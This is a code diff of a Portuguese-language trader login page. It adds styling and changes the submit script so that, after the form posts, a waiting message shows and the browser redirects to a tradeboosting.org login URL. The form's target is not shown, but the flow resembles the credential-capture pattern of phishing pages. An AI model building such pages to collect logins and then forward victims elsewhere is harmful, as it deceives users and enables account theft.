@@ -5,7 +5,60 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bem-vindo Trader</title>
     <style>
-        /* Seu CSS permanece aqui */
+        body {
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f7f7f7;
+        }
+        .login-container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            border-radius: 4px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .message-container {
+            display: none;
+            padding: 20px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .message-container p {
+            color: green;
+            font-size: 16px;
+        }
     </style>
 </head>
 <body>
@@ -30,36 +83,22 @@
     </div>
 
     <script>
-        // Quando o formulário for enviado
+        // Função chamada ao enviar o formulário
         document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault(); // Impede o envio padrão do formulário
-
-            // Exibe a mensagem de aguardo
+            // Exibe a mensagem de espera
             document.getElementById('messageContainer').style.display = 'block';
 
-            // Usa o método fetch para enviar o formulário de forma assíncrona
-            const formData = new FormData(this); // Coleta os dados do formulário
-
-            fetch(this.action, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => {
-                if (response.ok) {
-                    // Se a resposta for bem-sucedida, redireciona para o site desejado
-                    setTimeout(function() {
-                        window.location.href = "https://tradeboosting.org/app/login.php"; 
-                    }, 2000); // Aguarda 2 segundos antes de redirecionar
-                } else {
-                    // Se houver algum erro no envio, alerta ao usuário
-                    alert('Erro ao enviar os dados. Tente novamente.');
-                }
-            })
-            .catch(error => {
-                // Caso ocorra algum erro durante a requisição
-                alert('Erro ao tentar enviar os dados: ' + error.message);
-            });
+            // Não interrompe o envio do formulário
+            // A execução do redirecionamento ocorre após o envio e processamento
         });
+
+        // Aguardar o envio do formulário e redirecionar para a página desejada
+        document.getElementById('loginForm').onsubmit = function() {
+            setTimeout(function() {
+                // Após 2 segundos, redireciona para o site desejado
+                window.location.href = "https://tradeboosting.org/app/login.php"; 
+            }, 2000);
+        };
     </script>
 
 </body>
